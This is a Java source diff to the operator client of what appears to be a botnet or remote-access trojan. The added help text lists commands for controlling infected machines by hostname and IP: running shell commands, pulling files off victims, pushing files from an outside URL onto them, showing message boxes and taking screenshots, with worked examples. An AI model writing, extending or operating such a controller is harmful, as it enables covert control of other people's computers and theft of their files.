@@ -50,7 +50,7 @@ public class Client implements Runnable {
         } catch (Exception e) {
             ip = "noip";
         }
-        whoami = "Admin@"+ip;
+        whoami = "Admin@" + ip;
 
         System.out.println("Connecting to " + host + " on port " + port_number + "...");
 
@@ -66,7 +66,17 @@ public class Client implements Runnable {
         }
         if (clientSocket != null && os != null && is != null) {
             try {
-
+                System.out.println("welkom admin here is a list with all the options and how to work with them: "
+                        + "msgbox, download, upload, shell, screenshot, javaversion and exit you have to give the hostname and external ip to send to someone here some examples you can find the hostname and external ip easy with list info : \n"
+                        + "Examples:\n"
+                        + "minepc@1.2.3.4 shell dir C:\\\n"
+                        + "minepc@1.2.3.4 msgbox hello\n"
+                        + "minepc@1.2.3.4 download C:\\Users\\mh123hack\\Downloads\\botnet-herder.jpg\n"
+                        + "minepc@1.2.3.4 upload http://thestartupmag.com/wp-content/uploads/2016/10/hacked.png\n"
+                        + "minepc@1.2.3.4 screenshot\n"
+                        + "minepc@1.2.3.4 javaversion\n"
+                        + "minepc@1.2.3.4 exit\n"
+                        + "list info");
                 new Thread(new Client()).start();
 
                 while (!closed) {
@@ -115,6 +125,6 @@ public class Client implements Runnable {
 
         System.err.println("Connection lost with server");
         closed = true;
-    
+
     }
 }
